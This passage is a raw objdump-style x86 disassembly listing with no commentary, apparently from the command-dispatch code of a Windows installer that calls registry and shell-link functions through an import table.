  401df7:	ff 15 4c 70 40 00    	call   *0x40704c
  401dfd:	e9 31 07 00 00       	jmp    0x402533
  401e02:	53                   	push   %ebx
  401e03:	e8 78 0c 00 00       	call   0x402a80
  401e08:	6a 01                	push   $0x1
  401e0a:	8b f0                	mov    %eax,%esi
  401e0c:	e8 6f 0c 00 00       	call   0x402a80
  401e11:	39 5d e8             	cmp    %ebx,-0x18(%ebp)
  401e14:	50                   	push   %eax
  401e15:	56                   	push   %esi
  401e16:	75 0b                	jne    0x401e23
  401e18:	ff 15 f4 71 40 00    	call   *0x4071f4
  401e1e:	e9 0f 0b 00 00       	jmp    0x402932
  401e23:	ff 15 30 72 40 00    	call   *0x407230
  401e29:	e9 04 0b 00 00       	jmp    0x402932
  401e2e:	53                   	push   %ebx
  401e2f:	e8 69 0c 00 00       	call   0x402a9d
  401e34:	6a 31                	push   $0x31
  401e36:	8b f0                	mov    %eax,%esi
  401e38:	e8 60 0c 00 00       	call   0x402a9d
  401e3d:	6a 22                	push   $0x22
  401e3f:	8b d8                	mov    %eax,%ebx
  401e41:	e8 57 0c 00 00       	call   0x402a9d
  401e46:	53                   	push   %ebx
  401e47:	56                   	push   %esi
  401e48:	68 14 90 40 00       	push   $0x409014
  401e4d:	68 e8 9f 40 00       	push   $0x409fe8
  401e52:	8b f8                	mov    %eax,%edi
  401e54:	ff 15 54 72 40 00    	call   *0x407254
  401e5a:	83 c4 10             	add    $0x10,%esp
  401e5d:	6a ec                	push   $0xffffffec
  401e5f:	e8 c4 f5 ff ff       	call   0x401428
  401e64:	8a 07                	mov    (%edi),%al
  401e66:	ff 75 e8             	push   -0x18(%ebp)
  401e69:	f6 d8                	neg    %al
  401e6b:	1b c0                	sbb    %eax,%eax
  401e6d:	68 00 58 43 00       	push   $0x435800
  401e72:	23 c7                	and    %edi,%eax
  401e74:	50                   	push   %eax
  401e75:	8a 06                	mov    (%esi),%al
  401e77:	f6 d8                	neg    %al
  401e79:	1b c0                	sbb    %eax,%eax
  401e7b:	53                   	push   %ebx
  401e7c:	23 c6                	and    %esi,%eax
  401e7e:	50                   	push   %eax
  401e7f:	ff 75 f8             	push   -0x8(%ebp)
  401e82:	ff 15 58 71 40 00    	call   *0x407158
  401e88:	83 f8 21             	cmp    $0x21,%eax
  401e8b:	0f 8d a1 0a 00 00    	jge    0x402932
  401e91:	e9 41 08 00 00       	jmp    0x4026d7
  401e96:	53                   	push   %ebx
  401e97:	e8 01 0c 00 00       	call   0x402a9d
  401e9c:	8b f0                	mov    %eax,%esi
  401e9e:	56                   	push   %esi
  401e9f:	6a eb                	push   $0xffffffeb
  401ea1:	e8 c3 2e 00 00       	call   0x404d69
  401ea6:	68 00 58 43 00       	push   $0x435800
  401eab:	56                   	push   %esi
  401eac:	e8 71 33 00 00       	call   0x405222
  401eb1:	3b c3                	cmp    %ebx,%eax
  401eb3:	89 45 08             	mov    %eax,0x8(%ebp)
  401eb6:	0f 84 1b 08 00 00    	je     0x4026d7
  401ebc:	39 5d e4             	cmp    %ebx,-0x1c(%ebp)
  401ebf:	74 46                	je     0x401f07
  401ec1:	8b 35 fc 70 40 00    	mov    0x4070fc,%esi
  401ec7:	eb 07                	jmp    0x401ed0
  401ec9:	6a 0f                	push   $0xf
  401ecb:	e8 04 3e 00 00       	call   0x405cd4
  401ed0:	6a 64                	push   $0x64
  401ed2:	ff 75 08             	push   0x8(%ebp)
  401ed5:	ff d6                	call   *%esi
  401ed7:	3d 02 01 00 00       	cmp    $0x102,%eax
  401edc:	74 eb                	je     0x401ec9
  401ede:	8d 45 cc             	lea    -0x34(%ebp),%eax
  401ee1:	50                   	push   %eax
  401ee2:	ff 75 08             	push   0x8(%ebp)
  401ee5:	ff 15 00 71 40 00    	call   *0x407100
  401eeb:	39 5d e0             	cmp    %ebx,-0x20(%ebp)
  401eee:	7c 0b                	jl     0x401efb
  401ef0:	ff 75 cc             	push   -0x34(%ebp)
  401ef3:	57                   	push   %edi
  401ef4:	e8 09 3a 00 00       	call   0x405902
  401ef9:	eb 0c                	jmp    0x401f07
  401efb:	39 5d cc             	cmp    %ebx,-0x34(%ebp)
  401efe:	74 07                	je     0x401f07
  401f00:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  401f07:	ff 75 08             	push   0x8(%ebp)
  401f0a:	ff 15 a4 70 40 00    	call   *0x4070a4
  401f10:	e9 1d 0a 00 00       	jmp    0x402932
  401f15:	6a 02                	push   $0x2
  401f17:	e8 81 0b 00 00       	call   0x402a9d
  401f1c:	50                   	push   %eax
  401f1d:	e8 4a 3d 00 00       	call   0x405c6c
  401f22:	3b c3                	cmp    %ebx,%eax
  401f24:	89 45 08             	mov    %eax,0x8(%ebp)
  401f27:	74 13                	je     0x401f3c
  401f29:	8b d8                	mov    %eax,%ebx
  401f2b:	ff 73 14             	push   0x14(%ebx)
  401f2e:	57                   	push   %edi
  401f2f:	e8 ce 39 00 00       	call   0x405902
  401f34:	ff 73 18             	push   0x18(%ebx)
  401f37:	e9 45 f6 ff ff       	jmp    0x401581
  401f3c:	88 1e                	mov    %bl,(%esi)
  401f3e:	88 1f                	mov    %bl,(%edi)
  401f40:	e9 92 07 00 00       	jmp    0x4026d7
  401f45:	8d 45 a8             	lea    -0x58(%ebp),%eax
  401f48:	6a ee                	push   $0xffffffee
  401f4a:	89 45 08             	mov    %eax,0x8(%ebp)
  401f4d:	e8 4b 0b 00 00       	call   0x402a9d
  401f52:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  401f55:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  401f58:	51                   	push   %ecx
  401f59:	50                   	push   %eax
  401f5a:	e8 55 4c 00 00       	call   0x406bb4
  401f5f:	88 1e                	mov    %bl,(%esi)
  401f61:	3b c3                	cmp    %ebx,%eax
  401f63:	89 45 f8             	mov    %eax,-0x8(%ebp)
  401f66:	88 1f                	mov    %bl,(%edi)
  401f68:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  401f6f:	0f 84 bd 09 00 00    	je     0x402932
  401f75:	50                   	push   %eax
  401f76:	6a 40                	push   $0x40
  401f78:	ff 15 f8 70 40 00    	call   *0x4070f8
  401f7e:	3b c3                	cmp    %ebx,%eax
  401f80:	89 45 cc             	mov    %eax,-0x34(%ebp)
  401f83:	0f 84 a9 09 00 00    	je     0x402932
  401f89:	50                   	push   %eax
  401f8a:	ff 75 f8             	push   -0x8(%ebp)
  401f8d:	53                   	push   %ebx
  401f8e:	ff 75 d4             	push   -0x2c(%ebp)
  401f91:	e8 18 4c 00 00       	call   0x406bae
  401f96:	85 c0                	test   %eax,%eax
  401f98:	74 34                	je     0x401fce
  401f9a:	8d 45 bc             	lea    -0x44(%ebp),%eax
  401f9d:	50                   	push   %eax
  401f9e:	8d 45 08             	lea    0x8(%ebp),%eax
  401fa1:	50                   	push   %eax
  401fa2:	68 10 90 40 00       	push   $0x409010
  401fa7:	ff 75 cc             	push   -0x34(%ebp)
  401faa:	e8 f9 4b 00 00       	call   0x406ba8
  401faf:	85 c0                	test   %eax,%eax
  401fb1:	74 1b                	je     0x401fce
  401fb3:	8b 45 08             	mov    0x8(%ebp),%eax
  401fb6:	ff 70 08             	push   0x8(%eax)
  401fb9:	56                   	push   %esi
  401fba:	e8 43 39 00 00       	call   0x405902
  401fbf:	8b 45 08             	mov    0x8(%ebp),%eax
  401fc2:	ff 70 0c             	push   0xc(%eax)
  401fc5:	57                   	push   %edi
  401fc6:	e8 37 39 00 00       	call   0x405902
  401fcb:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  401fce:	ff 75 cc             	push   -0x34(%ebp)
  401fd1:	e9 05 fc ff ff       	jmp    0x401bdb
  401fd6:	33 ff                	xor    %edi,%edi
  401fd8:	68 01 80 00 00       	push   $0x8001
  401fdd:	47                   	inc    %edi
  401fde:	89 7d fc             	mov    %edi,-0x4(%ebp)
  401fe1:	ff 15 04 71 40 00    	call   *0x407104
  401fe7:	39 1d d0 f0 42 00    	cmp    %ebx,0x42f0d0
  401fed:	0f 8c 9d 00 00 00    	jl     0x402090
  401ff3:	6a f0                	push   $0xfffffff0
  401ff5:	e8 a3 0a 00 00       	call   0x402a9d
  401ffa:	57                   	push   %edi
  401ffb:	8b f0                	mov    %eax,%esi
  401ffd:	e8 9b 0a 00 00       	call   0x402a9d
  402002:	39 5d ec             	cmp    %ebx,-0x14(%ebp)
  402005:	89 45 08             	mov    %eax,0x8(%ebp)
  402008:	74 0d                	je     0x402017
  40200a:	56                   	push   %esi
  40200b:	ff 15 08 71 40 00    	call   *0x407108
  402011:	8b f8                	mov    %eax,%edi
  402013:	3b fb                	cmp    %ebx,%edi
  402015:	75 10                	jne    0x402027
  402017:	6a 08                	push   $0x8
  402019:	53                   	push   %ebx
  40201a:	56                   	push   %esi
  40201b:	ff 15 0c 71 40 00    	call   *0x40710c
  402021:	8b f8                	mov    %eax,%edi
  402023:	3b fb                	cmp    %ebx,%edi
  402025:	74 65                	je     0x40208c
  402027:	ff 75 08             	push   0x8(%ebp)
  40202a:	57                   	push   %edi
  40202b:	ff 15 10 71 40 00    	call   *0x407110
  402031:	8b f0                	mov    %eax,%esi
  402033:	3b f3                	cmp    %ebx,%esi
  402035:	74 3d                	je     0x402074
  402037:	39 5d e4             	cmp    %ebx,-0x1c(%ebp)
  40203a:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  40203d:	74 17                	je     0x402056
  40203f:	ff 75 e4             	push   -0x1c(%ebp)
  402042:	e8 e1 f3 ff ff       	call   0x401428
  402047:	ff d6                	call   *%esi
  402049:	85 c0                	test   %eax,%eax
  40204b:	74 31                	je     0x40207e
  40204d:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  402054:	eb 28                	jmp    0x40207e
  402056:	68 00 90 40 00       	push   $0x409000
  40205b:	68 e8 af 40 00       	push   $0x40afe8
  402060:	68 00 00 43 00       	push   $0x430000
  402065:	68 00 04 00 00       	push   $0x400
  40206a:	ff 75 f8             	push   -0x8(%ebp)
  40206d:	ff d6                	call   *%esi
  40206f:	83 c4 14             	add    $0x14,%esp
  402072:	eb 0a                	jmp    0x40207e
  402074:	ff 75 08             	push   0x8(%ebp)
  402077:	6a f7                	push   $0xfffffff7
  402079:	e8 eb 2c 00 00       	call   0x404d69
  40207e:	39 5d e8             	cmp    %ebx,-0x18(%ebp)
  402081:	75 14                	jne    0x402097
  402083:	57                   	push   %edi
  402084:	ff 15 14 71 40 00    	call   *0x407114
  40208a:	eb 0b                	jmp    0x402097
  40208c:	6a f6                	push   $0xfffffff6
  40208e:	eb 02                	jmp    0x402092
  402090:	6a e7                	push   $0xffffffe7
  402092:	e8 91 f3 ff ff       	call   0x401428
  402097:	53                   	push   %ebx
  402098:	ff 15 04 71 40 00    	call   *0x407104
  40209e:	e9 8f 08 00 00       	jmp    0x402932
  4020a3:	6a f0                	push   $0xfffffff0
  4020a5:	e8 f3 09 00 00       	call   0x402a9d
  4020aa:	6a df                	push   $0xffffffdf
  4020ac:	89 45 d0             	mov    %eax,-0x30(%ebp)
  4020af:	e8 e9 09 00 00       	call   0x402a9d
  4020b4:	6a 02                	push   $0x2
  4020b6:	8b f0                	mov    %eax,%esi
  4020b8:	e8 e0 09 00 00       	call   0x402a9d
  4020bd:	6a cd                	push   $0xffffffcd
  4020bf:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  4020c2:	e8 d6 09 00 00       	call   0x402a9d
  4020c7:	6a 45                	push   $0x45
  4020c9:	89 45 cc             	mov    %eax,-0x34(%ebp)
  4020cc:	e8 cc 09 00 00       	call   0x402a9d
  4020d1:	56                   	push   %esi
  4020d2:	89 45 bc             	mov    %eax,-0x44(%ebp)
  4020d5:	e8 2f 34 00 00       	call   0x405509
  4020da:	85 c0                	test   %eax,%eax
  4020dc:	75 07                	jne    0x4020e5
  4020de:	6a 21                	push   $0x21
  4020e0:	e8 b8 09 00 00       	call   0x402a9d
  4020e5:	8d 45 08             	lea    0x8(%ebp),%eax
  4020e8:	50                   	push   %eax
  4020e9:	68 18 74 40 00       	push   $0x407418
  4020ee:	6a 01                	push   $0x1
  4020f0:	53                   	push   %ebx
  4020f1:	68 28 74 40 00       	push   $0x407428
  4020f6:	ff 15 78 72 40 00    	call   *0x407278
  4020fc:	3b c3                	cmp    %ebx,%eax
  4020fe:	0f 8c d8 00 00 00    	jl     0x4021dc
  402104:	8b 45 08             	mov    0x8(%ebp),%eax
  402107:	8d 55 f8             	lea    -0x8(%ebp),%edx
  40210a:	52                   	push   %edx
  40210b:	68 38 74 40 00       	push   $0x407438
  402110:	8b 08                	mov    (%eax),%ecx
  402112:	50                   	push   %eax
  402113:	ff 11                	call   *(%ecx)
  402115:	8b f8                	mov    %eax,%edi
  402117:	3b fb                	cmp    %ebx,%edi
  402119:	0f 8c b0 00 00 00    	jl     0x4021cf
  40211f:	8b 45 08             	mov    0x8(%ebp),%eax
  402122:	56                   	push   %esi
  402123:	50                   	push   %eax
  402124:	8b 08                	mov    (%eax),%ecx
  402126:	ff 51 50             	call   *0x50(%ecx)
  402129:	8b f8                	mov    %eax,%edi
  40212b:	8b 45 08             	mov    0x8(%ebp),%eax
  40212e:	68 00 58 43 00       	push   $0x435800
  402133:	50                   	push   %eax
  402134:	8b 08                	mov    (%eax),%ecx
  402136:	ff 51 24             	call   *0x24(%ecx)
  402139:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  40213c:	be ff 00 00 00       	mov    $0xff,%esi
  402141:	8b c1                	mov    %ecx,%eax
  402143:	c1 f8 08             	sar    $0x8,%eax
  402146:	23 c6                	and    %esi,%eax
  402148:	74 0d                	je     0x402157
  40214a:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40214d:	50                   	push   %eax
  40214e:	51                   	push   %ecx
  40214f:	8b 11                	mov    (%ecx),%edx
  402151:	ff 52 3c             	call   *0x3c(%edx)
  402154:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  402157:	8b 45 08             	mov    0x8(%ebp),%eax
  40215a:	c1 f9 10             	sar    $0x10,%ecx
  40215d:	8b 10                	mov    (%eax),%edx
  40215f:	51                   	push   %ecx
  402160:	50                   	push   %eax
  402161:	ff 52 34             	call   *0x34(%edx)
  402164:	8b 45 cc             	mov    -0x34(%ebp),%eax
  402167:	38 18                	cmp    %bl,(%eax)
  402169:	74 12                	je     0x40217d
  40216b:	8b 55 ec             	mov    -0x14(%ebp),%edx
  40216e:	8b 45 08             	mov    0x8(%ebp),%eax
  402171:	23 d6                	and    %esi,%edx
  402173:	8b 08                	mov    (%eax),%ecx
  402175:	52                   	push   %edx
  402176:	ff 75 cc             	push   -0x34(%ebp)
  402179:	50                   	push   %eax
  40217a:	ff 51 44             	call   *0x44(%ecx)
  40217d:	8b 45 08             	mov    0x8(%ebp),%eax
  402180:	ff 75 d4             	push   -0x2c(%ebp)
  402183:	8b 08                	mov    (%eax),%ecx
  402185:	50                   	push   %eax
  402186:	ff 51 2c             	call   *0x2c(%ecx)
  402189:	8b 45 08             	mov    0x8(%ebp),%eax
  40218c:	ff 75 bc             	push   -0x44(%ebp)
  40218f:	8b 08                	mov    (%eax),%ecx
  402191:	50                   	push   %eax
  402192:	ff 51 1c             	call   *0x1c(%ecx)
  402195:	3b fb                	cmp    %ebx,%edi
  402197:	7c 2d                	jl     0x4021c6
  402199:	be e0 93 40 00       	mov    $0x4093e0,%esi
  40219e:	68 00 04 00 00       	push   $0x400
  4021a3:	56                   	push   %esi
  4021a4:	6a ff                	push   $0xffffffff
  4021a6:	ff 75 d0             	push   -0x30(%ebp)
  4021a9:	66 89 1d e0 93 40 00 	mov    %bx,0x4093e0
  4021b0:	53                   	push   %ebx
  4021b1:	53                   	push   %ebx
  4021b2:	ff 15 18 71 40 00    	call   *0x407118
  4021b8:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4021bb:	6a 01                	push   $0x1
  4021bd:	56                   	push   %esi
  4021be:	50                   	push   %eax
  4021bf:	8b 08                	mov    (%eax),%ecx
  4021c1:	ff 51 18             	call   *0x18(%ecx)
  4021c4:	8b f8                	mov    %eax,%edi
  4021c6:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4021c9:	50                   	push   %eax
  4021ca:	8b 08                	mov    (%eax),%ecx
  4021cc:	ff 51 08             	call   *0x8(%ecx)
  4021cf:	8b 45 08             	mov    0x8(%ebp),%eax
  4021d2:	50                   	push   %eax
  4021d3:	8b 08                	mov    (%eax),%ecx
  4021d5:	ff 51 08             	call   *0x8(%ecx)
  4021d8:	3b fb                	cmp    %ebx,%edi
  4021da:	7d 13                	jge    0x4021ef
  4021dc:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  4021e3:	6a f0                	push   $0xfffffff0
  4021e5:	e8 3e f2 ff ff       	call   0x401428
  4021ea:	e9 43 07 00 00       	jmp    0x402932
  4021ef:	6a f4                	push   $0xfffffff4
  4021f1:	eb f2                	jmp    0x4021e5
  4021f3:	53                   	push   %ebx
  4021f4:	e8 a4 08 00 00       	call   0x402a9d
  4021f9:	8b f0                	mov    %eax,%esi
  4021fb:	6a 11                	push   $0x11
  4021fd:	89 75 08             	mov    %esi,0x8(%ebp)
  402200:	e8 98 08 00 00       	call   0x402a9d
  402205:	8b f8                	mov    %eax,%edi
  402207:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40220a:	56                   	push   %esi
  40220b:	89 45 9c             	mov    %eax,-0x64(%ebp)
  40220e:	c7 45 a0 02 00 00 00 	movl   $0x2,-0x60(%ebp)
  402215:	e8 a0 37 00 00       	call   0x4059ba
  40221a:	57                   	push   %edi
  40221b:	88 5c 30 01          	mov    %bl,0x1(%eax,%esi,1)
  40221f:	e8 96 37 00 00       	call   0x4059ba
  402224:	be e8 a3 40 00       	mov    $0x40a3e8,%esi
  402229:	6a f8                	push   $0xfffffff8
  40222b:	56                   	push   %esi
  40222c:	88 5c 38 01          	mov    %bl,0x1(%eax,%edi,1)
  402230:	e8 91 37 00 00       	call   0x4059c6
  402235:	57                   	push   %edi
  402236:	56                   	push   %esi
  402237:	e8 84 37 00 00       	call   0x4059c0
  40223c:	8b 45 08             	mov    0x8(%ebp),%eax
  40223f:	56                   	push   %esi
  402240:	89 45 a4             	mov    %eax,-0x5c(%ebp)
  402243:	66 8b 45 e4          	mov    -0x1c(%ebp),%ax
  402247:	53                   	push   %ebx
  402248:	89 7d a8             	mov    %edi,-0x58(%ebp)
  40224b:	89 75 b6             	mov    %esi,-0x4a(%ebp)
  40224e:	66 89 45 ac          	mov    %ax,-0x54(%ebp)
  402252:	e8 12 2b 00 00       	call   0x404d69
  402257:	8d 45 9c             	lea    -0x64(%ebp),%eax
  40225a:	50                   	push   %eax
  40225b:	ff 15 5c 71 40 00    	call   *0x40715c
  402261:	85 c0                	test   %eax,%eax
  402263:	0f 84 c9 06 00 00    	je     0x402932
  402269:	53                   	push   %ebx
  40226a:	6a f9                	push   $0xfffffff9
  40226c:	e8 f8 2a 00 00       	call   0x404d69
  402271:	e9 61 04 00 00       	jmp    0x4026d7
  402276:	3d 0d f0 ad 0b       	cmp    $0xbadf00d,%eax
  40227b:	74 1d                	je     0x40229a
  40227d:	68 10 00 20 00       	push   $0x200010
  402282:	6a e8                	push   $0xffffffe8
  402284:	53                   	push   %ebx
  402285:	e8 3c 37 00 00       	call   0x4059c6
  40228a:	50                   	push   %eax
  40228b:	e8 0a 30 00 00       	call   0x40529a
  402290:	b8 ff ff ff 7f       	mov    $0x7fffffff,%eax
  402295:	e9 a3 06 00 00       	jmp    0x40293d
  40229a:	ff 05 b4 f0 42 00    	incl   0x42f0b4
  4022a0:	e9 8d 06 00 00       	jmp    0x402932
  4022a5:	33 f6                	xor    %esi,%esi
  4022a7:	33 ff                	xor    %edi,%edi
  4022a9:	3b c3                	cmp    %ebx,%eax
  4022ab:	74 08                	je     0x4022b5
  4022ad:	53                   	push   %ebx
  4022ae:	e8 ea 07 00 00       	call   0x402a9d
  4022b3:	8b f0                	mov    %eax,%esi
  4022b5:	39 5d e0             	cmp    %ebx,-0x20(%ebp)
  4022b8:	74 09                	je     0x4022c3
  4022ba:	6a 11                	push   $0x11
  4022bc:	e8 dc 07 00 00       	call   0x402a9d
  4022c1:	8b f8                	mov    %eax,%edi
  4022c3:	39 5d ec             	cmp    %ebx,-0x14(%ebp)
  4022c6:	74 09                	je     0x4022d1
  4022c8:	6a 22                	push   $0x22
  4022ca:	e8 ce 07 00 00       	call   0x402a9d
  4022cf:	8b d8                	mov    %eax,%ebx
  4022d1:	6a cd                	push   $0xffffffcd
  4022d3:	e8 c5 07 00 00       	call   0x402a9d
  4022d8:	50                   	push   %eax
  4022d9:	53                   	push   %ebx
  4022da:	57                   	push   %edi
  4022db:	56                   	push   %esi
  4022dc:	ff 15 1c 71 40 00    	call   *0x40711c
  4022e2:	e9 e1 f2 ff ff       	jmp    0x4015c8
  4022e7:	6a 01                	push   $0x1
  4022e9:	c7 45 08 21 4e 7e 00 	movl   $0x7e4e21,0x8(%ebp)
  4022f0:	e8 a8 07 00 00       	call   0x402a9d
  4022f5:	6a 12                	push   $0x12
  4022f7:	8b f8                	mov    %eax,%edi
  4022f9:	e8 9f 07 00 00       	call   0x402a9d
  4022fe:	6a dd                	push   $0xffffffdd
  402300:	89 45 d0             	mov    %eax,-0x30(%ebp)
  402303:	e8 95 07 00 00       	call   0x402a9d
  402308:	50                   	push   %eax
  402309:	68 ff 03 00 00       	push   $0x3ff
  40230e:	8d 45 08             	lea    0x8(%ebp),%eax
  402311:	56                   	push   %esi
  402312:	50                   	push   %eax
  402313:	ff 75 d0             	push   -0x30(%ebp)
  402316:	57                   	push   %edi
  402317:	ff 15 20 71 40 00    	call   *0x407120
  40231d:	8b 06                	mov    (%esi),%eax
  40231f:	3b 45 08             	cmp    0x8(%ebp),%eax
  402322:	e9 54 f4 ff ff       	jmp    0x40177b
  402327:	39 5d ec             	cmp    %ebx,-0x14(%ebp)
  40232a:	75 2b                	jne    0x402357
  40232c:	6a 02                	push   $0x2
  40232e:	e8 46 08 00 00       	call   0x402b79
  402333:	8b f0                	mov    %eax,%esi
  402335:	3b f3                	cmp    %ebx,%esi
  402337:	0f 84 9a 03 00 00    	je     0x4026d7
  40233d:	6a 33                	push   $0x33
  40233f:	e8 59 07 00 00       	call   0x402a9d
  402344:	50                   	push   %eax
  402345:	56                   	push   %esi
  402346:	ff 15 18 70 40 00    	call   *0x407018
  40234c:	56                   	push   %esi
  40234d:	8b f8                	mov    %eax,%edi
  40234f:	ff 15 1c 70 40 00    	call   *0x40701c
  402355:	eb 1f                	jmp    0x402376
  402357:	6a 22                	push   $0x22
  402359:	e8 3f 07 00 00       	call   0x402a9d
  40235e:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  402361:	83 e1 02             	and    $0x2,%ecx
  402364:	51                   	push   %ecx
  402365:	50                   	push   %eax
  402366:	ff 75 e0             	push   -0x20(%ebp)
  402369:	e8 f6 07 00 00       	call   0x402b64
  40236e:	50                   	push   %eax
  40236f:	e8 69 07 00 00       	call   0x402add
  402374:	8b f8                	mov    %eax,%edi
  402376:	3b fb                	cmp    %ebx,%edi
  402378:	0f 84 b4 05 00 00    	je     0x402932
  40237e:	e9 54 03 00 00       	jmp    0x4026d7
  402383:	50                   	push   %eax
  402384:	e8 db 07 00 00       	call   0x402b64
  402389:	8b 7d ec             	mov    -0x14(%ebp),%edi
  40238c:	8b f0                	mov    %eax,%esi
  40238e:	8b 45 f0             	mov    -0x10(%ebp),%eax
  402391:	6a 02                	push   $0x2
  402393:	89 45 d0             	mov    %eax,-0x30(%ebp)
  402396:	e8 02 07 00 00       	call   0x402a9d
  40239b:	6a 11                	push   $0x11
  40239d:	89 45 bc             	mov    %eax,-0x44(%ebp)
  4023a0:	e8 f8 06 00 00       	call   0x402a9d
  4023a5:	8d 4d 08             	lea    0x8(%ebp),%ecx
  4023a8:	53                   	push   %ebx
  4023a9:	51                   	push   %ecx
  4023aa:	53                   	push   %ebx
  4023ab:	6a 02                	push   $0x2
  4023ad:	53                   	push   %ebx
  4023ae:	53                   	push   %ebx
  4023af:	53                   	push   %ebx
  4023b0:	50                   	push   %eax
  4023b1:	56                   	push   %esi
  4023b2:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  4023b9:	ff 15 20 70 40 00    	call   *0x407020
  4023bf:	85 c0                	test   %eax,%eax
  4023c1:	0f 85 6b 05 00 00    	jne    0x402932
  4023c7:	83 ff 01             	cmp    $0x1,%edi
  4023ca:	be e8 a3 40 00       	mov    $0x40a3e8,%esi
  4023cf:	75 0e                	jne    0x4023df
  4023d1:	6a 23                	push   $0x23
  4023d3:	e8 c5 06 00 00       	call   0x402a9d
  4023d8:	56                   	push   %esi
  4023d9:	e8 dc 35 00 00       	call   0x4059ba
  4023de:	40                   	inc    %eax
  4023df:	83 ff 04             	cmp    $0x4,%edi
  4023e2:	75 0e                	jne    0x4023f2
  4023e4:	6a 03                	push   $0x3
  4023e6:	e8 95 06 00 00       	call   0x402a80
  4023eb:	57                   	push   %edi
  4023ec:	a3 e8 a3 40 00       	mov    %eax,0x40a3e8
  4023f1:	58                   	pop    %eax
  4023f2:	83 ff 03             	cmp    $0x3,%edi
  4023f5:	75 0f                	jne    0x402406
  4023f7:	68 00 0c 00 00       	push   $0xc00
  4023fc:	56                   	push   %esi
  4023fd:	53                   	push   %ebx
  4023fe:	ff 75 e8             	push   -0x18(%ebp)
  402401:	e8 ae 0a 00 00       	call   0x402eb4
  402406:	50                   	push   %eax
  402407:	56                   	push   %esi
  402408:	ff 75 d0             	push   -0x30(%ebp)
  40240b:	53                   	push   %ebx
  40240c:	ff 75 bc             	push   -0x44(%ebp)
  40240f:	ff 75 08             	push   0x8(%ebp)
  402412:	ff 15 04 70 40 00    	call   *0x407004
  402418:	85 c0                	test   %eax,%eax
  40241a:	75 03                	jne    0x40241f
  40241c:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  40241f:	ff 75 08             	push   0x8(%ebp)
  402422:	e9 d1 00 00 00       	jmp    0x4024f8
  402427:	68 19 00 02 00       	push   $0x20019
  40242c:	e8 48 07 00 00       	call   0x402b79
  402431:	6a 33                	push   $0x33
  402433:	8b f8                	mov    %eax,%edi
  402435:	e8 63 06 00 00       	call   0x402a9d
  40243a:	3b fb                	cmp    %ebx,%edi
  40243c:	88 1e                	mov    %bl,(%esi)
  40243e:	0f 84 93 02 00 00    	je     0x4026d7
  402444:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  402447:	c7 45 cc ff 03 00 00 	movl   $0x3ff,-0x34(%ebp)
  40244e:	51                   	push   %ecx
  40244f:	8d 4d 08             	lea    0x8(%ebp),%ecx
  402452:	56                   	push   %esi
  402453:	51                   	push   %ecx
  402454:	53                   	push   %ebx
  402455:	50                   	push   %eax
  402456:	57                   	push   %edi
  402457:	ff 15 00 70 40 00    	call   *0x407000
  40245d:	33 c9                	xor    %ecx,%ecx
  40245f:	41                   	inc    %ecx
  402460:	85 c0                	test   %eax,%eax
  402462:	75 37                	jne    0x40249b
  402464:	83 7d 08 04          	cmpl   $0x4,0x8(%ebp)
  402468:	74 1b                	je     0x402485
  40246a:	39 4d 08             	cmp    %ecx,0x8(%ebp)
  40246d:	74 06                	je     0x402475
  40246f:	83 7d 08 02          	cmpl   $0x2,0x8(%ebp)
  402473:	75 26                	jne    0x40249b
  402475:	39 5d ec             	cmp    %ebx,-0x14(%ebp)
  402478:	74 03                	je     0x40247d
  40247a:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  40247d:	8b 45 cc             	mov    -0x34(%ebp),%eax
  402480:	88 1c 30             	mov    %bl,(%eax,%esi,1)
  402483:	eb 72                	jmp    0x4024f7
  402485:	39 5d ec             	cmp    %ebx,-0x14(%ebp)
  402488:	75 07                	jne    0x402491
  40248a:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  402491:	ff 36                	push   (%esi)
  402493:	56                   	push   %esi
  402494:	e8 69 34 00 00       	call   0x405902
  402499:	eb 5c                	jmp    0x4024f7
  40249b:	88 1e                	mov    %bl,(%esi)
  40249d:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  4024a0:	eb 55                	jmp    0x4024f7
  4024a2:	68 19 00 02 00       	push   $0x20019
  4024a7:	e8 cd 06 00 00       	call   0x402b79
  4024ac:	6a 03                	push   $0x3
  4024ae:	8b f8                	mov    %eax,%edi
  4024b0:	e8 cb 05 00 00       	call   0x402a80
  4024b5:	3b fb                	cmp    %ebx,%edi
  4024b7:	88 1e                	mov    %bl,(%esi)
  4024b9:	0f 84 18 02 00 00    	je     0x4026d7
  4024bf:	39 5d ec             	cmp    %ebx,-0x14(%ebp)
  4024c2:	b9 ff 03 00 00       	mov    $0x3ff,%ecx
  4024c7:	89 4d 08             	mov    %ecx,0x8(%ebp)
  4024ca:	74 0c                	je     0x4024d8
  4024cc:	51                   	push   %ecx
  4024cd:	56                   	push   %esi
  4024ce:	50                   	push   %eax
  4024cf:	57                   	push   %edi
  4024d0:	ff 15 08 70 40 00    	call   *0x407008
  4024d6:	eb 19                	jmp    0x4024f1
  4024d8:	53                   	push   %ebx
  4024d9:	53                   	push   %ebx
  4024da:	53                   	push   %ebx
  4024db:	8d 4d 08             	lea    0x8(%ebp),%ecx
  4024de:	53                   	push   %ebx
  4024df:	51                   	push   %ecx
  4024e0:	56                   	push   %esi
  4024e1:	50                   	push   %eax
  4024e2:	57                   	push   %edi
  4024e3:	ff 15 0c 70 40 00    	call   *0x40700c
  4024e9:	85 c0                	test   %eax,%eax
  4024eb:	0f 85 e6 01 00 00    	jne    0x4026d7
  4024f1:	88 9e ff 03 00 00    	mov    %bl,0x3ff(%esi)
